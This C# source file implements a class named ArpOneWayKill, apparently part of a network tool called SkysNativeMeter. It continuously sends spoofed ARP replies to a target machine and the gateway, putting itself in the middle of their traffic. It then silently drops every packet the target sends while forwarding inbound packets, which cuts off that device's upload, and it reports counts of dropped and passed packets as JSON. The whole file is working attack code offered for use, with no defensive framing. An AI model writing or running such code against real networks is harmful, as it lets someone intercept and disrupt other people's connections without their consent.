using System.Net;
using System.Net.NetworkInformation;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace SkysNativeMeter;

internal sealed class ArpOneWayKill : IDisposable
{
    private readonly string _targetIp;
    private readonly PhysicalAddress _targetMac;
    private readonly string _gatewayIp;
    private readonly LibPcapLiveDevice _device;
    private readonly PhysicalAddress _ourMac;
    private readonly CancellationTokenSource _cts = new();
    private PhysicalAddress _gatewayMac;
    private long _droppedUpload;
    private long _passedDownload;

    public ArpOneWayKill(string targetIp, string targetMac, string gatewayIp, string ifaceHint, string localIp)
    {
        _targetIp = targetIp;
        _targetMac = NetworkHelper.ParseMac(targetMac);
        _gatewayIp = gatewayIp;
        _device = NetworkHelper.ResolveDevice(ifaceHint, localIp);
        _ourMac = NetworkHelper.GetOurMac(_device);
        _gatewayMac = NetworkHelper.ResolveMac(gatewayIp, PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"));

        NetworkHelper.EnableIpForwarding(_device.Description);
        NetworkHelper.WarmArp(_targetIp);
        NetworkHelper.WarmArp(_gatewayIp);
        _gatewayMac = NetworkHelper.ResolveMac(_gatewayIp, _gatewayMac);
    }

    public void Run()
    {
        _device.Open(DeviceModes.Promiscuous, 1000);
        _device.Filter = $"ip and host {_targetIp}";

        NetworkHelper.EmitJson(new
        {
            type = "started",
            mode = "oneway",
            ip = _targetIp,
            mac = NetworkHelper.NormalizeMac(_targetMac.ToString()),
            engine = "native"
        });

        _device.OnPacketArrival += OnPacket;
        var poisonTask = Task.Run(PoisonLoop, _cts.Token);
        var statsTask = Task.Run(StatsLoop, _cts.Token);

        try
        {
            _device.Capture();
        }
        catch (OperationCanceledException)
        {
            // shutting down
        }
        finally
        {
            _device.OnPacketArrival -= OnPacket;
            try { _device.StopCapture(); } catch { /* ignore */ }
            try { _device.Close(); } catch { /* ignore */ }
            _cts.Cancel();
            Task.WaitAll(new[] { poisonTask, statsTask }, 2000);
        }
    }

    private void PoisonLoop()
    {
        while (!_cts.IsCancellationRequested)
        {
            try
            {
                _gatewayMac = NetworkHelper.ResolveMac(_gatewayIp, _gatewayMac);
                MitmForwarder.SendArpReply(_device, _ourMac, _targetMac, _targetMac, IPAddress.Parse(_targetIp), IPAddress.Parse(_gatewayIp));
                MitmForwarder.SendArpReply(_device, _ourMac, _gatewayMac, _gatewayMac, IPAddress.Parse(_gatewayIp), IPAddress.Parse(_targetIp));
            }
            catch
            {
                // continue
            }

            Thread.Sleep(1500);
        }
    }

    private void StatsLoop()
    {
        while (!_cts.IsCancellationRequested)
        {
            Thread.Sleep(5000);
            NetworkHelper.EmitJson(new
            {
                type = "oneway_stats",
                ip = _targetIp,
                dropped_upload = Interlocked.Read(ref _droppedUpload),
                passed_download = Interlocked.Read(ref _passedDownload)
            });
        }
    }

    private void OnPacket(object? sender, PacketCapture e)
    {
        try
        {
            var raw = e.GetPacket();
            var packet = Packet.ParsePacket(raw.LinkLayerType, raw.Data);
            if (packet is not EthernetPacket eth || eth.PayloadPacket is not IPv4Packet ip)
            {
                return;
            }

            if (ip.SourceAddress.ToString() == _targetIp)
            {
                Interlocked.Increment(ref _droppedUpload);
                return;
            }

            if (ip.DestinationAddress.ToString() == _targetIp)
            {
                Interlocked.Increment(ref _passedDownload);
                MitmForwarder.ForwardIp(_device, _ourMac, ip, _targetMac);
            }
        }
        catch
        {
            // ignore
        }
    }

    public void Dispose()
    {
        _cts.Cancel();
        try { _device.StopCapture(); } catch { /* ignore */ }
        try { _device.Close(); } catch { /* ignore */ }
    }
}
